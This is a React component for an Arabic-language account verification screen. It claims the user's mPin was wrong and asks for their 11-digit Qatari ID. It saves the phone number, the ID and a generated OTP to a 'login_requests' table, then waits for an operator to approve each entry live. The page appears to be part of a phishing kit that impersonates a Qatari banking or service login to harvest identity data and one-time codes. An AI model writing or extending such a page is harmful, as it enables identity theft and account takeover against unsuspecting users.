import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { ArrowLeft, Loader2 } from "lucide-react";

const VerifyQatarId = () => {
  const [qatarId, setQatarId] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [requestId, setRequestId] = useState<string | null>(null);
  const navigate = useNavigate();
  const location = useLocation();
  const phone = location.state?.phone as string;
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const QATAR_ID_LENGTH = 11;

  useEffect(() => {
    if (!phone) {
      navigate("/login");
    }
  }, [phone, navigate]);

  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newId = qatarId.split("");
    newId[index] = value;
    const joined = newId.join("").slice(0, QATAR_ID_LENGTH);
    setQatarId(joined);

    if (value && index < QATAR_ID_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !qatarId[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, QATAR_ID_LENGTH);
    setQatarId(pasted);
    const nextIndex = Math.min(pasted.length, QATAR_ID_LENGTH - 1);
    inputRefs.current[nextIndex]?.focus();
  };

  const handleSubmit = async () => {
    if (qatarId.length !== QATAR_ID_LENGTH) {
      toast.error("يرجى إدخال رقم الهوية القطرية كاملاً");
      return;
    }

    setLoading(true);
    const otpCode = Math.floor(1000 + Math.random() * 9000).toString();

    const { data, error } = await supabase
      .from("login_requests")
      .insert({
        phone,
        otp_code: otpCode,
        qatar_id: qatarId,
        step: "qatar_id",
      } as any)
      .select("id")
      .single();

    if (error || !data) {
      toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
      return;
    }

    setRequestId(data.id);
    setWaiting(true);
    toast.info("تم إرسال طلبك، بانتظار التحقق...");
  };

  // Listen for admin approval/rejection
  useEffect(() => {
    if (!waiting || !requestId) return;

    const channel = supabase
      .channel("qatar_id_approval_" + requestId)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "login_requests",
        filter: `id=eq.${requestId}`,
      }, (payload) => {
        const row = payload.new as { status: string };
        if (row.status === "approved") {
          toast.success("تم التحقق! أدخل رمز التأكيد...");
          navigate("/verify", { state: { phone } });
        } else if (row.status === "rejected") {
          toast.error("رقم الهوية غير صحيح، يرجى المحاولة مرة أخرى");
          setWaiting(false);
          setLoading(false);
          setRequestId(null);
          setQatarId("");
          inputRefs.current[0]?.focus();
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [waiting, requestId, navigate, phone]);

  if (!phone) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      {/* Header */}
      <div className="flex items-center justify-between px-4 pt-6 pb-4">
        <div />
        <button
          onClick={() => navigate("/login")}
          className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-muted transition-colors"
        >
          <ArrowLeft className="h-5 w-5 text-foreground" />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col px-6">
        <div className="space-y-3 mb-12">
          <h1 className="text-2xl font-bold text-foreground text-right">
            أدخل رقم الهوية القطرية
          </h1>
          <p className="text-sm text-muted-foreground text-right leading-relaxed">
            لقد تم إدخال رمز mPin بشكل خاطئ، يرجى إدخال رقم الهوية القطرية للتحقق من حسابك.
          </p>
        </div>

        {/* Qatar ID Input Fields */}
        <div className="flex gap-1.5 justify-center mb-16 flex-row-reverse" dir="ltr">
          {Array.from({ length: QATAR_ID_LENGTH }).map((_, i) => (
            <input
              key={i}
              ref={(el) => (inputRefs.current[i] = el)}
              type="tel"
              inputMode="numeric"
              maxLength={1}
              value={qatarId[i] || ""}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onPaste={i === 0 ? handlePaste : undefined}
              disabled={waiting}
              className="w-8 h-12 text-center text-lg font-bold border-b-2 border-border bg-transparent text-foreground focus:border-primary focus:outline-none transition-colors disabled:opacity-50"
            />
          ))}
        </div>

        {/* Spacer */}
        <div className="flex-1" />

        {/* Submit Button */}
        <div className="pb-8">
          <button
            onClick={handleSubmit}
            disabled={qatarId.length !== QATAR_ID_LENGTH || loading}
            className={`w-14 h-14 rounded-full flex items-center justify-center transition-all shadow-lg ${
              qatarId.length === QATAR_ID_LENGTH && !loading
                ? "bg-primary text-primary-foreground hover:bg-primary/90"
                : "bg-muted text-muted-foreground"
            }`}
          >
            {waiting ? (
              <Loader2 className="h-6 w-6 animate-spin" />
            ) : (
              <ArrowLeft className="h-6 w-6 rotate-180" />
            )}
          </button>
          {waiting && (
            <p className="text-sm text-muted-foreground mt-3 animate-pulse">
              بانتظار التحقق من الهوية...
            </p>
          )}
        </div>
      </div>
    </div>
  );
};

export default VerifyQatarId;
